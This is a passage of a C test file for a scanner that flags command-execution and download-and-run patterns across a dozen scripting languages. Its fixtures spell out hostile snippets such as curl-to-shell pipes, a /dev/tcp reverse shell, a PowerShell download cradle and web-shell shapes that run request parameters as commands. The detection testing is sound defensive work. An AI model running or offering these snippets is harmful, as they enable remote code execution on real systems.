/*
 * diag_text_stmt - the TEXT route for the languages that write a call WITHOUT A BRACKET, and the forms that run a command out of a string: vbscript and classic asp
 * (`Execute x`, `o.Run cmd, 0, True`, COM objects), sh, batch, powershell and tcl (the first word of a command, the pipe), cfml (tags), perl and ruby's bare commands
 * and backtick, php's backtick, asp.net's `Request["x"]` and server controls, and jscript's COM (`new ActiveXObject`).
 *
 * What is pinned is the graph and nothing about a verdict, as in diag_text_langs.c: for each text WHICH facts hold between its nodes - a request that reaches a command or an
 * eval, a fetch that reaches a command (the pipe of `curl u | sh`), a decode that reaches one - and, as much, which do NOT: a word inside `echo` is no command, `conn.Execute sql` is
 * no `Execute`, a pipe is not a `;`. Each row says its facts as a mask and the whole mask is compared, so a fact that appears where the row does not list it fails as surely as one
 * that is missing. Every text is written the way the language is written, one behaviour each.
 *
 * ALSO PINNED: the names a script "imports" when its object's class is a row of another table (COM in js: told as the VBS table spells it, and found by the gate's own lookup);
 * a command word that does not fit the buffer is refused and not cut; and that what the lexer hides is hidden (a tcl brace, a here-document, a comment). The hostile shapes (names of a megabyte, brackets a hundred
 * thousand deep, tags and islands that never close) were read here against a clock; they are counted in diag_text_work.c.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <phenotype/diag_text_private.h>
#include <celllysis/nucleo.h>
#include <textual/textual.h>

#include "diag_text_graph.h"
#include "diag_text_testlib.h"

enum {
	F_REQ_EXEC = 1u << 0,   /* a request value reaches a command */
	F_REQ_EVAL = 1u << 1,   /* ... reaches an eval */
	F_DEC_EVAL = 1u << 2,   /* a decode's result reaches an eval */
	F_FETCH_EXEC = 1u << 3, /* a download reaches a command (`curl u | sh`) */
	F_FETCH_EVAL = 1u << 4, /* a download reaches an eval (`iex (New-Object Net.WebClient).DownloadString(u)`) */
	F_DEC_EXEC = 1u << 5,   /* a decode's result reaches a command */
	F_REQ_DEC = 1u << 6,    /* a request reaches a decoder */
	F_DEC_LOAD = 1u << 7,   /* a decode's result reaches a loaded class or assembly */
	F_ANY_EXEC = 1u << 8,   /* there is a command node at all */
	F_ANY_EVAL = 1u << 9,   /* there is an eval node at all */
	F_BUILT_EXEC = 1u << 10,/* a command whose class or name the program built */
	F_NET = 1u << 11,       /* a node that connects (net-connect) */
	F_REQ_FILE = 1u << 12,  /* a request reaches the delete of a file */
	F_REQ_CALL = 1u << 13,  /* the request is the TARGET of a call by a value (data-call) */
	F_HTTP = 1u << 14,      /* an http-connect node: a COM XMLHTTP's Open */
	F_ANY_FETCH = 1u << 15, /* a download node */
	F_ANY_DECODE = 1u << 16,/* a decode node */
	F_REQ_LOAD = 1u << 17   /* a request reaches the include of a file */
};

struct row {
	uint32_t    lang;
	const char *src;
	unsigned    want;
};

static unsigned facts(const struct kgenome_diag_scan *s)
{
	unsigned f = 0;

	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) ? F_REQ_EXEC : 0u;
	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EVAL, 0xff) ? F_REQ_EVAL : 0u;
	f |= linked(s, KGENOME_NUCLEO_DECODE, KGENOME_NUCLEO_EVAL, 0xff) ? F_DEC_EVAL : 0u;
	f |= linked(s, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) ? F_FETCH_EXEC : 0u;
	f |= linked(s, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_EVAL, 0xff) ? F_FETCH_EVAL : 0u;
	f |= linked(s, KGENOME_NUCLEO_DECODE, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) ? F_DEC_EXEC : 0u;
	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_DECODE, 0xff) ? F_REQ_DEC : 0u;
	f |= linked(s, KGENOME_NUCLEO_DECODE, KGENOME_NUCLEO_DYNLOAD, 0xff) ? F_DEC_LOAD : 0u;
	f |= count(s, KGENOME_NUCLEO_EXEC_IMAGE) ? F_ANY_EXEC : 0u;
	f |= count(s, KGENOME_NUCLEO_EVAL) ? F_ANY_EVAL : 0u;
	f |= built_node(s, KGENOME_NUCLEO_EXEC_IMAGE) ? F_BUILT_EXEC : 0u;
	f |= count(s, KGENOME_NUCLEO_NET_CONNECT) ? F_NET : 0u;
	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_FILE_DELETE, 0xff) ? F_REQ_FILE : 0u;
	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_DYNCALL, KGENOME_DIAG_ROLE_TARGET) ? F_REQ_CALL : 0u;
	f |= count(s, KGENOME_NUCLEO_HTTP_CONNECT) ? F_HTTP : 0u;
	f |= count(s, KGENOME_NUCLEO_HTTP_FETCH) ? F_ANY_FETCH : 0u;
	f |= count(s, KGENOME_NUCLEO_DECODE) ? F_ANY_DECODE : 0u;
	f |= linked(s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_LIB_OPEN, 0xff) ? F_REQ_LOAD : 0u;
	return f;
}

#define VB KGENOME_TEXTUAL_LANG_VBS
#define ASP KGENOME_TEXTUAL_LANG_ASP
#define SH KGENOME_TEXTUAL_LANG_SH
#define BAT KGENOME_TEXTUAL_LANG_BAT
#define PS KGENOME_TEXTUAL_LANG_PSH
#define TCL KGENOME_TEXTUAL_LANG_TCL
#define CF KGENOME_TEXTUAL_LANG_CFM
#define PL KGENOME_TEXTUAL_LANG_PERL
#define RB KGENOME_TEXTUAL_LANG_RUBY
#define PHP KGENOME_TEXTUAL_LANG_PHP
#define JS KGENOME_TEXTUAL_LANG_JS
#define AX KGENOME_TEXTUAL_LANG_ASPX
#define PY KGENOME_TEXTUAL_LANG_PY

static const struct row rows[] = {
	/* ================= vbscript: a statement is a call, a member that is a row is a node ================= */
	{ VB, "Set sh = CreateObject(\"WScript.Shell\")\nsh.Run cmd, 0, True\n", F_ANY_EXEC },
	{ VB, "Set sh = CreateObject(\"WScript.Shell\")\nCall sh.Run(\"calc\", 0, True)\nx = sh.Exec(\"calc\")\n", F_ANY_EXEC },
	/* a ProgID has no version in the table: the version the program asks for is dropped */
	{ VB, "Set x = CreateObject(\"MSXML2.XMLHTTP.6.0\")\nx.Open \"GET\", \"http://a/b\", False\nx.Send\n", F_HTTP },
	/* a class the program JOINED is the class, and the node is told built */
	{ VB, "Set o = CreateObject(\"WScr\" & \"ipt.Shell\")\no.Run \"calc\"\n", F_ANY_EXEC | F_BUILT_EXEC },
	/* the statements Execute and ExecuteGlobal; the member of an object that is called Execute is a database's */
	/* the capitalised rows of vbscript's table (CInt, CLng, CDbl, Len, IsNumeric, UBound ...) are numbers and truth values: what flows into them does not come out (S2-4: the lookup folded one side) */
	{ VB, "a = CInt(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = CLng(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = CDbl(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = Len(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = IsNumeric(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = cint(Request(\"x\"))\nExecute a\n", F_ANY_EVAL },
	{ VB, "a = Trim(Request(\"x\"))\nExecute a\n", F_REQ_EVAL | F_ANY_EVAL },
	{ VB, "a = CInt(Request(\"x\")) & Request(\"y\")\nExecute a\n", F_REQ_EVAL | F_ANY_EVAL },
	{ VB, "Execute x\nExecuteGlobal \"a\" & y\n", F_ANY_EVAL },
	{ VB, "Set conn = CreateObject(\"ADODB.Connection\")\nconn.Execute sql\nconn.Execute(sql)\n", 0 },
	{ VB, "x = StrReverse(\"tcejbo\")\nExecute x\n", F_DEC_EVAL | F_ANY_EVAL | F_ANY_DECODE },
	{ VB, "Execute StrReverse(x)\n", F_DEC_EVAL | F_ANY_EVAL | F_ANY_DECODE },
	/* ":" ends a statement; Then and Else begin one; a line that goes on with "_" is one */
	{ ASP, "<%\nSet sh = Server.CreateObject(\"WScript.Shell\")\ncmd = Request(\"c\") : sh.Run cmd\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ ASP, "<%\nSet sh = Server.CreateObject(\"WScript.Shell\")\nIf a Then sh.Run Request(\"c\") Else sh.Run \"ls\"\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ ASP, "<%\nSet sh = Server.CreateObject(\"WScript.Shell\")\nsh.Run \"cmd /c \" & _\n  Request.Form(\"c\"), 0, True\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
	/* NOT: the request is another statement; a line break ends it */
	{ ASP, "<%\nSet sh = Server.CreateObject(\"WScript.Shell\")\nx = Request(\"c\")\nsh.Run \"ls\"\n%>\n", F_ANY_EXEC },
	{ ASP, "<%\nSet sh = Server.CreateObject(\"WScript.Shell\")\nsh.Run \"ls\"\nx = Request(\"c\")\n%>\n", F_ANY_EXEC },
	/* the request: a default collection, a named one, a variable; ServerVariables is the page's own and is not it */
	{ ASP, "<%\nSet sh = CreateObject(\"WScript.Shell\")\ncmd = Request.QueryString(\"c\")\nsh.Run cmd\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ ASP, "<%\nSet sh = CreateObject(\"WScript.Shell\")\nsh.Run Request.ServerVariables(\"URL\")\n%>\n", F_ANY_EXEC },
	{ ASP, "<%\nFor Each k In Request.Form\nNext\nExecute Request.Form(\"x\")\n%>\n", F_REQ_EVAL | F_ANY_EVAL },
	/* variables do not care about case, in vb */
	{ ASP, "<%\nSet oSh = CreateObject(\"WScript.Shell\")\nSet r = osh.Exec(Request.Form(\"c\"))\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
	/* a function's name that is assigned its result is no variable that holds a callable: calling it is no call of a value */
	{ ASP, "<%\nFunction f()\n  f = Request(\"c\")\nEnd Function\nx = f()\ny = Request.QueryString(\"k\")(1)\n%>\n", 0 },
	/* an island that never ends, and one with no code */
	{ ASP, "<% Execute Request(\"x\")\n", F_REQ_EVAL | F_ANY_EVAL },
	{ ASP, "<html>no code</html><%%>\n", 0 },

	/* ================= jscript: COM is the VBS table's; a joined class is built ================= */
	{ JS, "var sh = new ActiveXObject(\"WScript.Shell\");\nsh.Run(req.query.c, 0, true);\n", F_REQ_EXEC | F_ANY_EXEC },
	{ JS, "new ActiveXObject(\"WScript.Shell\").Run(req.query.c);\n", F_REQ_EXEC | F_ANY_EXEC },
	{ JS, "var s = new ActiveXObject(\"WScr\" + \"ipt.Shell\");\ns.Run(\"x\");\n", F_ANY_EXEC | F_BUILT_EXEC },
	{ JS, "var x = new ActiveXObject(\"Microsoft.XMLHTTP\");\nx.open(\"GET\", u, false);\n", F_HTTP },
	/* NOT: an object of a class this does not know, and a member of a variable that is no object of one */
	{ JS, "var x = new ActiveXObject(\"Shell.Foo\");\nx.Run(req.query.c);\nvar y = obj;\ny.Run(req.query.c);\n", 0 },

	/* ================= sh: the first word of a command ================= */
	{ SH, "curl -s http://x/y | sh\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "sudo wget -q http://x/y -O- | bash\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "x=$QUERY_STRING\necho $x | base64 -d | sh\n", F_REQ_DEC | F_DEC_EXEC | F_ANY_EXEC | F_ANY_DECODE },
	{ SH, "y=$(wget -qO- http://q)\nsh -c \"$y\"\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "y=`wget -qO- http://q`\nsh -c \"$y\"\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "if [ -f /tmp/a ]; then nohup /usr/bin/curl http://z | sh; fi\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "for i in a b; do wget http://x/$i | bash; done\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "FOO=1 busybox wget http://x -O /tmp/a\n", F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", F_ANY_EXEC | F_NET },
	{ SH, "cmd=$QUERY_STRING\n$cmd arg\n", F_REQ_CALL },
	{ SH, "z=$(echo $HTTP_COOKIE | base64 -d)\nsh -c \"echo ${z}\"\n", F_REQ_DEC | F_DEC_EXEC | F_ANY_EXEC | F_ANY_DECODE },
	/* NOT: a word inside echo is no command; a pipe is not a ";" or "&&"; a here-document is data; a comment; a name in a string */
	{ SH, "echo curl http://x | cat\necho \"curl x | sh\"\n", 0 },
	{ SH, "curl -s http://x/y; sh /tmp/y\ncurl http://x && sh\n", F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "cat <<EOF\ncurl http://x | sh\nEOF\n", 0 },
	{ SH, "# curl http://x | sh\necho 'wget x | sh'\n", 0 },
	{ SH, "x=$QUERY_STRING\ny=1\necho $y | base64 -d | sh\n", F_DEC_EXEC | F_ANY_EXEC | F_ANY_DECODE },
	{ SH, "x=1 y=2 curl http://a | sh\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "echo $(curl -s http://x | sh)\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "(cd /tmp; wget http://a -O- | sh)\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
	{ SH, "wget http://a\nsh\n", F_ANY_EXEC | F_ANY_FETCH },
	/* a name with an "@" is not the name before it (the table ends a comparison there); ${x} outside a string is the variable x */
	{ SH, "curl@evil http://x | sh\n", F_ANY_EXEC },
	{ SH, "x=$QUERY_STRING\necho ${x} | base64 -d | sh\n", F_REQ_DEC | F_DEC_EXEC | F_ANY_EXEC | F_ANY_DECODE },

	/* ================= batch ================= */
	{ BAT, "@echo off\ncurl -o a.exe http://x/y & start /b a.exe\n", F_ANY_FETCH },
	{ BAT, "if exist a.exe powershell -ep bypass -c x\n", F_ANY_EXEC },
	{ BAT, "if not \"%1\"==\"\" cmd /c x\nif %a% neq b cmd /c y\n", F_ANY_EXEC },
	{ BAT, "%SystemRoot%\\System32\\cmd.exe /c certutil -decode a b\n", F_ANY_EXEC },
	{ BAT, "certutil -decode a.b a.exe && start \"\" a.exe\n", F_ANY_DECODE },
	{ BAT, "@cmd /c x\nstart \"t\" /min powershell -c y\n", F_ANY_EXEC },
	{ BAT, "for %%i in (a b) do cmd /c x\n", F_ANY_EXEC },
	/* NOT: the text of echo, a comment, a command that is the argument of one that makes no node */
	{ BAT, "echo powershell -c x\nrem cmd /c x\n:: cmd /c y\n", 0 },
	{ BAT, "echo a & echo cmd /c x\ncall x.bat cmd\n", 0 },

	/* ================= powershell: cmdlets, the pipeline, calls on objects ================= */
	{ PS, "IEX (New-Object Net.WebClient).DownloadString('http://x')\n", F_FETCH_EVAL | F_ANY_EVAL | F_ANY_FETCH },
	{ PS, "$x = (New-Object System.Net.WebClient).DownloadString('http://x')\nInvoke-Expression $x\n", F_FETCH_EVAL | F_ANY_EVAL | F_ANY_FETCH },
	{ PS, "$wc = New-Object Net.WebClient\niex $wc.DownloadString('http://x')\n", F_FETCH_EVAL | F_ANY_EVAL | F_ANY_FETCH },
	{ PS, "$b = [Convert]::FromBase64String($p)\n[Reflection.Assembly]::Load($b)\n", F_DEC_LOAD | F_ANY_DECODE },
	{ PS, "$p = [System.Convert]::FromBase64String($s)\n$p | iex\n", F_DEC_EVAL | F_ANY_EVAL | F_ANY_DECODE },
	{ PS, "$sh = New-Object -ComObject WScript.Shell\n$sh.Run(\"calc\")\n", F_ANY_EXEC },
	{ PS, "$c = [Text.Encoding]::UTF8.GetString($b)\n& $c\n", 0 },
	{ PS, "Start-Process \"c:\\x.exe\"\npowershell -nop -c x\n", F_ANY_EXEC },
	/* NOT: an argument is no command; a string at the head is a value; a member of a variable that holds no class; a here-string */
	{ PS, "Write-Host iex $x\n'powershell'\n\"iex\"\n", 0 },
	{ PS, "$o.DownloadString('http://x')\n$o.Run(\"calc\")\n", 0 },
	{ PS, "$x = 1\nWrite-Output $x\n", 0 },

	/* ================= tcl: a command and its subcommand; the braces are the lexer's ================= */
	{ TCL, "exec [ncgi::value cmd]\n", F_REQ_EXEC | F_ANY_EXEC },
	{ TCL, "file delete -force [ncgi::value f]\n", F_REQ_FILE },
	{ TCL, "set s [socket host 80]\nhttp::geturl http://x\nbinary decode base64 xx\n", F_NET | F_ANY_FETCH | F_ANY_DECODE },
	/* NOT: a command inside a braced body is a string to the lexer, a name in a comment, an argument */
	{ TCL, "proc f {} { exec $x }\ncatch {exec ls}\n", 0 },
	{ TCL, "# exec ls\nputs exec\n", 0 },

	/* ================= cfml: tags, scopes, java objects ================= */
	{ CF, "<cfexecute name=\"cmd.exe\" arguments=\"/c #form.cmd#\" timeout=\"10\"></cfexecute>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ CF, "<cfset c = form.cmd>\n<cfexecute name=\"#c#\">\n</cfexecute>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ CF, "<cfscript>\nrt = createObject(\"java\", \"java.lang.Runtime\");\np = rt.getRuntime().exec(url.c);\n</cfscript>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ CF, "<cfscript>Evaluate(form.e);</cfscript>\n", F_REQ_EVAL | F_ANY_EVAL },
	{ CF, "<cfinclude template=\"#url.f#\">\n", F_REQ_LOAD },
	/* NOT: the request is only shown; a tag in a comment; an attribute's name is no variable; a tag that is no row */
	{ CF, "<cfexecute name=\"ls\"></cfexecute>\n<cfoutput>#form.cmd#</cfoutput>\n", F_ANY_EXEC },
	{ CF, "<!--- <cfexecute name=\"#form.c#\"> --->\n", 0 },
	{ CF, "<cfset name = form.cmd>\n<cfexecute name=\"ls\" arguments=\"x\">\n</cfexecute>\n", F_ANY_EXEC },
	{ CF, "<cfset x = form.cmd>\n<cfif x eq 1>y</cfif>\n", 0 },
	/* a tag that never closes, a comment that never closes */
	{ CF, "<cfexecute name=\"#form.c#\"", F_REQ_EXEC | F_ANY_EXEC },

	/* ================= perl and ruby: a command with no bracket, and the backtick ================= */
	{ PL, "my $c = $ENV{QUERY_STRING};\nsystem \"ls $c\";\n", F_REQ_EXEC | F_ANY_EXEC },
	{ PL, "my $c = $ENV{QUERY_STRING};\nmy $o = `ls $c`;\n", F_REQ_EXEC | F_ANY_EXEC },
	{ PL, "my $o = qx{ls $ENV{QUERY_STRING}};\n", F_REQ_EXEC | F_ANY_EXEC },
	{ PL, "my $c = $ENV{QUERY_STRING};\neval $c;\n", F_REQ_EVAL | F_ANY_EVAL },
	{ PL, "my $c = $ENV{QUERY_STRING};\nunlink $c;\n", F_REQ_FILE },
	{ PL, "my $c = $ENV{QUERY_STRING};\nexec 'sh', $c;\n", F_REQ_EXEC | F_ANY_EXEC },
	/* NOT: eval {} is a block; a command in single quotes holds no variable; a name that is a hash key or a method; the request is not in it */
	{ PL, "my $c = $ENV{QUERY_STRING};\neval { system \"ls\" };\n", F_ANY_EXEC },
	{ PL, "my $c = $ENV{QUERY_STRING};\nsystem 'ls $c';\n", F_ANY_EXEC },
	{ PL, "my %h = (system => 1, exec => 2);\n$h{system} = 3;\n$obj->system;\n", 0 },
	{ PL, "my $c = $ENV{QUERY_STRING};\nmy $o = `ls`;\n", F_ANY_EXEC },
	{ RB, "cmd = params[:c]\nsystem \"ls #{cmd}\"\n", F_REQ_EXEC | F_ANY_EXEC },
	{ RB, "x = `ls #{params[:q]}`\n", F_REQ_EXEC | F_ANY_EXEC },
	{ RB, "x = %x(echo #{params[:q]})\n", F_REQ_EXEC | F_ANY_EXEC },
	{ RB, "cmd = params[:c]\nexec \"sh\", cmd\neval cmd\n", F_REQ_EXEC | F_REQ_EVAL | F_ANY_EXEC | F_ANY_EVAL },
	/* NOT: a block form of eval, a method of another object, a single quoted command, no request in the string */
	{ RB, "instance_eval do\n  puts params[:z]\nend\n", 0 },
	{ RB, "conn.exec \"select #{params[:z]}\"\n", 0 },
	{ RB, "cmd = params[:c]\nsystem 'ls #{cmd}'\n", F_ANY_EXEC },
	{ RB, "cmd = params[:c]\nsystem \"ls\"\nputs cmd\n", F_ANY_EXEC },

	/* ================= php: the backtick ================= */
	{ PHP, "<?php $o = `ls {$_GET['c']}`;\n", F_REQ_EXEC | F_ANY_EXEC },
	{ PHP, "<?php $c = $_GET['c']; echo `ls $c`;\n", F_REQ_EXEC | F_ANY_EXEC },
	{ PHP, "<?php echo `id`; $s = \"`not a command`\";\n", F_ANY_EXEC },

	/* ================= asp.net: the request through an index or a call, a server control's text ================= */
	{ AX, "<script runat=\"server\">\nvoid f() { string c = Request[\"c\"]; Process.Start(c); }\n</script>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ AX, "<%@ Page Language=\"VB\" %>\n<script runat=\"server\">\nSub f()\n  c = Request(\"c\")\n  Process.Start(c)\nEnd Sub\n</script>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f() { Process.Start(txtArg.Text); }\n</script>\n", F_REQ_EXEC | F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f() { string c = txtArg.Value; Process.Start(c); }\n</script>\n", F_REQ_EXEC | F_ANY_EXEC },
	/* NOT: a control that is written, a local string that has a member of that name, a parameter's member, the request's own properties, an unrelated indexer */
	{ AX, "<script runat=\"server\">\nvoid f() { lblOut.Text = \"x\"; Process.Start(\"calc\"); }\n</script>\n", F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f() { Process.Start(lblOut.Text = \"x\"); }\n</script>\n", F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f(Box b) { Process.Start(b.Text); }\n</script>\n", F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f() { Box t = new Box(); Process.Start(t.Text); }\n</script>\n", F_ANY_EXEC },
	{ AX, "<script runat=\"server\">\nvoid f() { Process.Start(Request.UserHostAddress); string a = arr[\"c\"]; }\n</script>\n", F_ANY_EXEC },
};

static void rows_run(void)
{
	size_t i;

	for (i = 0; i < sizeof rows / sizeof rows[0]; i++) {
		struct kgenome_diag_scan *s = scan_l(rows[i].lang, rows[i].src);
		unsigned got;

		CK(s != NULL, "scan of: %s", rows[i].src);
		if (!s)
			continue;
		got = facts(s);
		CK(got == rows[i].want, "facts %#x, wanted %#x in: %s", got, rows[i].want, rows[i].src);
		kgenome_diag_scan_free(s);
	}
}

/* ---- the names a script imports: COM is a row of the VBS table whatever language made the object ---- */

struct names { char v[16][64]; int n; };

static void collect(void *u, const char *name, uint32_t len)
{
	struct names *m = u;

	if (m->n < 16 && len < 64) {
		memcpy(m->v[m->n], name, len);
		m->v[m->n++][len] = 0;
	}
}

static int has(const struct names *m, const char *w)
{
	int i;

	for (i = 0; i < m->n; i++)
		if (!strcmp(m->v[i], w))
			return 1;
	return 0;
}

static void names(void)
{
	struct names nm;
	const char *js = "var s = new ActiveXObject(\"WScript.Shell\");\ns.Run(a);\neval(b);\n";
	const char *ps = "$sh = New-Object -ComObject WScript.Shell\n$sh.Run(\"x\")\nIEX $y\n";
	const char *sh = "curl u | sh\nwget v\ncurl w\n";

	memset(&nm, 0, sizeof nm);
	kgenome_diag_text_names((const uint8_t *)js, strlen(js), JS, NULL, collect, &nm);
	CK(nm.n == 2 && has(&nm, "WScript.Shell.Run") && has(&nm, "eval"), "js names, COM as the VBS table spells it: %d", nm.n);
	memset(&nm, 0, sizeof nm);
	kgenome_diag_text_names((const uint8_t *)ps, strlen(ps), PS, NULL, collect, &nm);
	CK(nm.n == 2 && has(&nm, "WScript.Shell.Run") && has(&nm, "iex"), "powershell names: %d", nm.n);
	memset(&nm, 0, sizeof nm);
	kgenome_diag_text_names((const uint8_t *)sh, strlen(sh), SH, NULL, collect, &nm);
	CK(nm.n == 3 && has(&nm, "curl") && has(&nm, "sh") && has(&nm, "wget"), "sh names, each once: %d", nm.n);
	/* the gate's own lookup (the engine asks the lib): own table first, then the objects' */
	CK(kgenome_diag_text_cap_of_name(JS, "WScript.Shell.Run") == KGENOME_NUCLEO_EXEC_IMAGE, "COM name for js");
	CK(kgenome_diag_text_cap_of_name(JS, "eval") == KGENOME_NUCLEO_EVAL, "own name for js");
	CK(kgenome_diag_text_cap_of_name(JS, "Execute") == KGENOME_NUCLEO_NONE, "a name of the VBS table that is no COM object's is not js's");
	CK(kgenome_diag_text_cap_of_name(PY, "WScript.Shell.Run") == KGENOME_NUCLEO_NONE, "python has no COM objects: nothing to look up");
	CK(kgenome_diag_text_cap_of_name(9999u, "eval") == KGENOME_NUCLEO_NONE, "a language with no row");
}

/* ---- the rows against their tables: a command the tables spell, the row's fold is the table's ---- */

static void folds(void)
{
	static const struct { uint32_t lang; const char *probe; } P[] = {
		{ VB, "WScript.Shell.Run" }, { ASP, "Request.Form" }, { SH, "curl" }, { BAT, "certutil" }, { PS, "Invoke-Expression" }, { TCL, "exec" }, { CF, "cfexecute" },
	};
	size_t i, k;

	for (i = 0; i < sizeof P / sizeof P[0]; i++) {
		const struct kgenome_dtx_lang *l = kgenome_dtx_lang_find(P[i].lang);
		char up[64];

		CK(l && kgenome_nucleo_cap_of_name(l->target, P[i].probe) != KGENOME_NUCLEO_NONE, "%s is a row of target %u", P[i].probe, l ? l->target : 0u);
		for (k = 0; P[i].probe[k]; k++)
			up[k] = (char)(P[i].probe[k] >= 'a' && P[i].probe[k] <= 'z' ? P[i].probe[k] - 32 : P[i].probe[k]);
		up[k] = 0;
		CK(l && (kgenome_nucleo_cap_of_name(l->target, up) != KGENOME_NUCLEO_NONE) == (l->fold != 0), "row fold of target %u is the table's", l ? l->target : 0u);
	}
}

/* ---- a name that does not fit is refused, not cut ---- */

static void refused(void)
{
	char *src = malloc(1u << 16);
	struct kgenome_diag_scan *s;
	int i;

	if (!src)
		return;
	/* a command word of 70 bytes is no row; its first 63 are not the row either, and nothing is made of it */
	strcpy(src, "curl");
	for (i = 0; i < 70; i++)
		strcat(src, "x");
	strcat(src, " u | sh\n");
	s = scan_l(SH, src);
	CK(s && count(s, KGENOME_NUCLEO_HTTP_FETCH) == 0 && count(s, KGENOME_NUCLEO_EXEC_IMAGE) == 1, "a command word too long to hold is not looked up");
	if (s)
		kgenome_diag_scan_free(s);
	/* a path that ends in the row: the last piece is the command, whatever the path's length */
	strcpy(src, "");
	for (i = 0; i < 40; i++)
		strcat(src, "/dir0123456789");
	strcat(src, "/curl u | sh\n");
	s = scan_l(SH, src);
	CK(s && count(s, KGENOME_NUCLEO_HTTP_FETCH) == 1, "the command is the last piece of a long path");
	if (s)
		kgenome_diag_scan_free(s);
	/* a COM class too long for the buffer: refused */
	strcpy(src, "Set o = CreateObject(\"");
	for (i = 0; i < 70; i++)
		strcat(src, "a");
	strcat(src, "\")\no.Run x\n");
	s = scan_l(VB, src);
	CK(s && count(s, KGENOME_NUCLEO_EXEC_IMAGE) == 0, "a class too long to hold is refused");
	if (s)
		kgenome_diag_scan_free(s);
	free(src);
}

/* ---- what the lexer hides is hidden: a command inside a string is a string unless the row reads its interpolation ---- */

static void hidden(void)
{
	struct kgenome_diag_scan *s;

	s = scan_l(SH, "sh -c 'curl http://x | sh'\n");
	CK(s && count(s, KGENOME_NUCLEO_HTTP_FETCH) == 0 && count(s, KGENOME_NUCLEO_EXEC_IMAGE) == 1, "a single quoted command line is data");
	if (s)
		kgenome_diag_scan_free(s);
	s = scan_l(SH, "x=\"$(curl http://x | sh)\"\n");
	CK(s && count(s, KGENOME_NUCLEO_HTTP_FETCH) == 1, "a command substitution inside a double quoted string is a command");
	if (s)
		kgenome_diag_scan_free(s);
	s = scan_l(BAT, "cmd /c \"curl http://x | sh\"\n");
	CK(s && count(s, KGENOME_NUCLEO_EXEC_IMAGE) == 1 && count(s, KGENOME_NUCLEO_HTTP_FETCH) == 0, "a quoted batch command line is a string");
	if (s)
		kgenome_diag_scan_free(s);
	s = scan_l(TCL, "set x {exec ls}\nputs \"exec $x\"\n");
	CK(s && count(s, KGENOME_NUCLEO_EXEC_IMAGE) == 0, "a braced tcl word is a string");
	if (s)
		kgenome_diag_scan_free(s);
}

/* ---- names and spacing nobody would write by hand: the variable's name is any name ---- */

static void random_names(void)
{
	static const struct { uint32_t lang; const char *fmt; unsigned want; } T[] = {
		{ SH, "@1=$QUERY_STRING\necho $@1 | base64 -d | sh\n", F_REQ_DEC | F_DEC_EXEC | F_ANY_EXEC | F_ANY_DECODE },
		{ SH, "@1=$(curl -s http://x)\nsh -c \"$@1\"\n", F_FETCH_EXEC | F_ANY_EXEC | F_ANY_FETCH },
		{ ASP, "<%\nSet @1 = CreateObject(\"WScript.Shell\")\n@1.Run Request(\"c\")\n%>\n", F_REQ_EXEC | F_ANY_EXEC },
		{ VB, "@1 = Request(\"c\")\nSet @2 = CreateObject(\"WScript.Shell\")\n@2.Run @1, 0\n", F_REQ_EXEC | F_ANY_EXEC },
		{ PS, "$@1 = (New-Object Net.WebClient).DownloadString('http://x')\niex $@1\n", F_FETCH_EVAL | F_ANY_EVAL | F_ANY_FETCH },
		{ PS, "$@1 = New-Object -ComObject WScript.Shell\n$@1.Run(\"x\")\n", F_ANY_EXEC },
		{ JS, "var @1 = new ActiveXObject(\"WScript.Shell\");\n@1.Run(req.query.c);\n", F_REQ_EXEC | F_ANY_EXEC },
		{ CF, "<cfset @1 = form.cmd>\n<cfexecute name=\"#@1#\">\n</cfexecute>\n", F_REQ_EXEC | F_ANY_EXEC },
		{ PL, "my $@1 = $ENV{QUERY_STRING};\nsystem \"ls $@1\";\n", F_REQ_EXEC | F_ANY_EXEC },
